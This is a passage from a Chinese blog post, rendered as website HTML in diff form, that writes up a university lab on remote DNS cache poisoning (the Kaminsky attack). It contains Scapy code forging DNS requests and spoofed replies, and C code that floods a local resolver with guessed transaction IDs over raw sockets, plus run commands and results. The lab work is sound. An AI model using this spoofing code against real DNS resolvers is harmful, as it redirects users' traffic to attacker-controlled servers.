            <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                rdata = <span class="string">&#x27;1.2.3.52&#x27;</span>,</span><br><span class="line">                ttl = <span class="number">259200</span>)</span><br><span class="line">Addsec3 = DNSRR(rrname = <span class="string">&#x27;testdns.com&#x27;</span>,</span><br><span class="line">                <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                rdata = <span class="string">&#x27;1.2.3.53&#x27;</span>,</span><br><span class="line">                ttl = <span class="number">259200</span>)             </span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">            qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">            ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">            nscount=<span class="number">2</span>, ns = NSsec1/NSsec,</span><br><span class="line">            arcount=<span class="number">4</span>, ar = Addsec/Addsec1/Addsec2/Addsec3)</span><br></pre></td></tr></table></figure>
+
+<p>添加了多种类型的域名，最终Additional Section中没有缓存成功的。不知道为什么。</p>
+<h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><h3 id="环境测试-1"><a href="#环境测试-1" class="headerlink" title="环境测试"></a>环境测试</h3><p>首先删除与该环境可能发生冲突的、之前的环境遗留下来的问题。</p>
+<ul>
+<li>docker network rm ID：删除10.9.0.0那个子网，通过docker network ls可以查看网卡ID</li>
+<li>docker rm ID：删除attacker-ns那个容器(10.9.0.153)，通过docker ps -a可以查看容器ID</li>
+</ul>
+<p>查询ns.attacker32.com的IP，user执行<code>dig ns.attacker32.com</code>，得到的IP就是local dns中的配置结果。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210111532659.png" alt="image-20221210111532659"></p>
+<p>查询<a target="_blank" rel="noopener" href="http://www.example.com的ip/">www.example.com的IP</a></p>
+<ol>
+<li>user执行<code>dig www.example.com</code>，没有Answer</li>
+<li>user执行<code>dig @ns.attacker32.com www.example.com</code>，得到attacker dsn中配置的IP地址<code>1.2.3.5</code></li>
+</ol>
+<h3 id="Lab2-构造DNS请求"><a href="#Lab2-构造DNS请求" class="headerlink" title="Lab2 构造DNS请求"></a>Lab2 构造DNS请求</h3><p>当这个请求发送时，local dns会发起迭代查询</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目的IP为local dns，源IP为任意IP，若该dns不对局域网外的请求做出回应，则将源IP改为与DNS服务器同一局域网的IP</span></span><br><span class="line">ip  = IP (dst=<span class="string">&#x27;10.9.0.53&#x27;</span>, src=<span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">udp = UDP(dport=<span class="number">53</span>, sport=<span class="number">50945</span>, chksum=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># aaaaa为5个字节的占位符，在C代码中会进行随机化修改</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&#x27;aaaaa.example.com&#x27;</span>)</span><br><span class="line"><span class="comment"># 这个ID在实际场景中是个变量</span></span><br><span class="line">dns   = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, qr=<span class="number">0</span>, qdcount=<span class="number">1</span>, qd=Qdsec)</span><br><span class="line">pkt = ip/udp/dns</span><br><span class="line"><span class="comment"># 写为二进制文件，C代码中使用</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_req.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(pkt))</span><br></pre></td></tr></table></figure>
+
+<h3 id="Lab3-DNS欺骗relpy"><a href="#Lab3-DNS欺骗relpy" class="headerlink" title="Lab3 DNS欺骗relpy"></a>Lab3 DNS欺骗relpy</h3><p>local dns清除缓存<code>rndc</code>，开启wireshark，user执行<code>dig www.example.com</code>，查看抓包结果：</p>
+<ol>
+<li>向.com顶级域名的权威服务器查询example.com的权威服务器。</li>
+<li>从返回结果中选择一个，将其IP作为DNS欺骗包的源IP<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225830708.png" alt="image-20221210225830708"></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源IP为通过dig寻找到的一个真实的nameserver地址</span></span><br><span class="line">ip  = IP (dst = <span class="string">&#x27;10.9.0.53&#x27;</span>, src = <span class="string">&#x27;192.5.6.30&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>, sport = <span class="number">53</span>,  chksum=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># QuestionSection aaaaa为占位符</span></span><br><span class="line">Qdsec  = DNSQR(qname  = <span class="string">&quot;aaaaa.example.com&quot;</span>)</span><br><span class="line"><span class="comment"># AnswerSection aaaaa为占位符，rdata任意值</span></span><br><span class="line">Anssec = DNSRR(rrname = <span class="string">&quot;aaaaa.example.com&quot;</span>,</span><br><span class="line">               <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">               rdata  = <span class="string">&#x27;1.1.1.1&#x27;</span>, </span><br><span class="line">               ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># AuthoritySection rrname为查询的域名 rdata为该域名对应的DNS权威服务器，设为attacker ns</span></span><br><span class="line">NSsec  = DNSRR(rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">               <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>, </span><br><span class="line">               rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">               ttl    = <span class="number">259200</span>)</span><br><span class="line"><span class="comment"># 0xAAAA为4字节的占位符，表示DNS的ID，在C代码中会进行递增修改</span></span><br><span class="line">dns    = DNS(<span class="built_in">id</span>  = <span class="number">0xAAAA</span>, aa=<span class="number">1</span>, rd=<span class="number">1</span>, qr=<span class="number">1</span>, </span><br><span class="line">             qdcount = <span class="number">1</span>, qd = Qdsec,</span><br><span class="line">             ancount = <span class="number">1</span>, an = Anssec, </span><br><span class="line">             nscount = <span class="number">1</span>, ns = NSsec)</span><br><span class="line"><span class="comment"># 写为二进制文件，C代码中使用</span></span><br><span class="line">Replypkt = ip/udp/dns</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_resp.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(Replypkt))</span><br></pre></td></tr></table></figure>
+
+<p>此段代码是攻击者假装是.example.com的权威服务器向local dns进行回应，如果响应的ID恰好等于DNS请求的ID，则local dns会将响应包中AuthoritySection中的权威服务器缓存到本地。</p>
+<h3 id="Lab4-构造攻击C代码"><a href="#Lab4-构造攻击C代码" class="headerlink" title="Lab4 构造攻击C代码"></a>Lab4 构造攻击C代码</h3><p>原理：随机对一个example.com的子域名(如aaaaa.example.com)发起DNS请求，然后攻击者针对此域名查询发送DNS响应包，根据报文结构可知ID在2字节的范围内(0~65535)递增，可能的结果：</p>
+<ul>
+<li>命中ID的欺骗包在真的响应包之前到达，local dns缓存attacker ns作为example.com的权威服务器</li>
+<li>否则，local dns先收到真的响应包，由于大概率没有这个随即构造的子域名，local dns并不会缓存权威服务器的信息，重新生成子域名即可继续攻击。</li>
+</ul>
+<p>读取二进制文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DNS请求包</span></span><br><span class="line">FILE * f_req = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">unsigned char ip_req[MAX_FILE_SIZE];</span><br><span class="line"><span class="comment"># 第二个参数表示一次读取一个字节，返回读取的字节数</span></span><br><span class="line"><span class="built_in">int</span> n_req = fread(ip_req, <span class="number">1</span>, MAX_FILE_SIZE, f_req);</span><br><span class="line"><span class="comment"># DNS响应包</span></span><br><span class="line">FILE * f_resp = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">unsigned char ip_resp[MAX_FILE_SIZE];</span><br><span class="line"><span class="built_in">int</span> n_resp = fread(ip_resp, <span class="number">1</span>, MAX_FILE_SIZE, f_resp);</span><br></pre></td></tr></table></figure>
+
+<p>攻击流程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="type">char</span> name[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(name,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 随机生成5字节，用来修改之前aaaaa占位符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)  name[k] = a[rand() % <span class="number">26</span>];</span><br><span class="line">    <span class="comment">// 发送DNS请求包</span></span><br><span class="line">    send_dns_request(ip_req,n_req,name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;request for %s.example.com\n&quot;</span>,name);</span><br><span class="line">    <span class="comment">// 发送DNS响应包，每次的id加1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">65536</span>;i++)&#123;</span><br><span class="line">        send_dns_response(ip_resp,n_resp,name,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送DNS请求包：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">send_dns_request</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name)</span>&#123;</span><br><span class="line">    <span class="comment">// 将请求中的aaaaa改为本次攻击的随机生成的子域名</span></span><br><span class="line">	<span class="built_in">memcpy</span>(buffer+<span class="number">41</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line">	send_raw_packet(buffer,pkt_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送DNS响应包：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer,<span class="type">int</span> pkt_size,<span class="type">char</span> * name,<span class="type">unsigned</span> <span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> tmp[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	*tmp=htons(id);</span><br><span class="line">    <span class="comment">// 修改id</span></span><br><span class="line">	<span class="built_in">memcpy</span>(buffer+<span class="number">28</span>,(<span class="type">void</span>*)tmp,<span class="number">2</span>);	</span><br><span class="line">    <span class="comment">// 修改Qdsec中的aaaaa</span></span><br><span class="line">	<span class="built_in">memcpy</span>(buffer+<span class="number">41</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line">	<span class="comment">// 修改Anssec中的aaaaa</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buffer+<span class="number">64</span>,(<span class="type">unsigned</span> <span class="type">char</span>*)name,<span class="number">5</span>);</span><br><span class="line">	send_raw_packet(buffer,pkt_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过原始套接字将构造好的包发送出去：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">  <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 创建原始套接字</span></span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">	     &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line">  <span class="comment">// 获取目的IP对应的sockaddr_in结构体</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">  dest_info.sin_family = AF_INET;</span><br><span class="line">  dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line">  <span class="comment">// 发送包</span></span><br><span class="line">  sendto(sock, buffer, pkt_size, <span class="number">0</span>,</span><br><span class="line">       (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">  close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Task5-攻击效果"><a href="#Task5-攻击效果" class="headerlink" title="Task5 攻击效果"></a>Task5 攻击效果</h3><ol>
+<li>local dns清除缓存：<code>rndc flush</code></li>
+<li>发起攻击：<code>gcc attacke.c</code>，<code>sudo ./a.out</code><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225025331.png" alt="image-20221210225025331"></li>
+<li>在local dns中查看缓存结果：<code> rndc dumpdb -cache &amp;&amp; grep attacker /var/cache/bind/dump.db</code>，当有attacker dns的缓存后停止攻击<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210224942160.png" alt="image-20221210224942160"></li>
+<li>user执行<code>dig www.example.com</code>，local dns返回的结果为attacker ns中配置的1.2.3.5，因为local dns在看到example.com时会直接向缓存中attacker dns询问。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225235729.png" alt="image-20221210225235729"></li>
+<li>user执行<code>dig @ns.attacker32.com www.example.com</code>，attacker dns返回1,2,3,5<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225401775.png" alt="image-20221210225401775"></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-TCP%E6%94%BB%E5%87%BB/" rel="prev" title="网络攻防-TCP攻击">
+      <i class="fa fa-chevron-left"></i> 网络攻防-TCP攻击
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E7%86%94%E6%96%AD%E4%B8%8E%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/" rel="next" title="网络攻防-熔断与幽灵攻击">
+      网络攻防-熔断与幽灵攻击 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%90%86%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">理论</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E6%9F%A5%E8%AF%A2%E8%BF%87%E7%A8%8B"><span class="nav-number">1.1.</span> <span class="nav-text">DNS查询过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%93%8D%E5%BA%94"><span class="nav-number">1.2.</span> <span class="nav-text">DNS响应</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="nav-number">1.3.</span> <span class="nav-text">DNS数据包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.</span> <span class="nav-text">DNS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kaminsky%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.1.</span> <span class="nav-text">Kaminsky攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E6%AD%A2DNS%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.2.</span> <span class="nav-text">防止DNS缓存中毒攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C"><span class="nav-number">2.</span> <span class="nav-text">实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0"><span class="nav-number">2.1.</span> <span class="nav-text">本地</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95"><span class="nav-number">2.1.1.</span> <span class="nav-text">环境测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task1-%E6%9E%84%E9%80%A0DNS%E5%93%8D%E5%BA%94%E5%8C%85"><span class="nav-number">2.1.2.</span> <span class="nav-text">Task1 构造DNS响应包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task2-DNS%E6%8A%95%E6%AF%92"><span class="nav-number">2.1.3.</span> <span class="nav-text">Task2 DNS投毒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task3-%E6%9E%84%E9%80%A0%E8%99%9A%E5%81%87%E6%9D%83%E5%A8%81%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.1.4.</span> <span class="nav-text">Task3 构造虚假权威服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task4-%E6%B7%BB%E5%8A%A0%E5%85%B6%E4%BB%96%E5%9F%9F%E5%90%8D%E7%9A%84%E6%9D%83%E5%A8%81%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.1.5.</span> <span class="nav-text">Task4 添加其他域名的权威服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task5-Additional-Section"><span class="nav-number">2.1.6.</span> <span class="nav-text">Task5 Additional Section</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">远程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">环境测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab2-%E6%9E%84%E9%80%A0DNS%E8%AF%B7%E6%B1%82"><span class="nav-number">2.2.2.</span> <span class="nav-text">Lab2 构造DNS请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab3-DNS%E6%AC%BA%E9%AA%97relpy"><span class="nav-number">2.2.3.</span> <span class="nav-text">Lab3 DNS欺骗relpy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab4-%E6%9E%84%E9%80%A0%E6%94%BB%E5%87%BBC%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.4.</span> <span class="nav-text">Lab4 构造攻击C代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task5-%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C"><span class="nav-number">2.2.5.</span> <span class="nav-text">Task5 攻击效果</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/banner.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description">热爱可抵岁月漫长</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Seanxz401" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Seanxz401" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sean</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
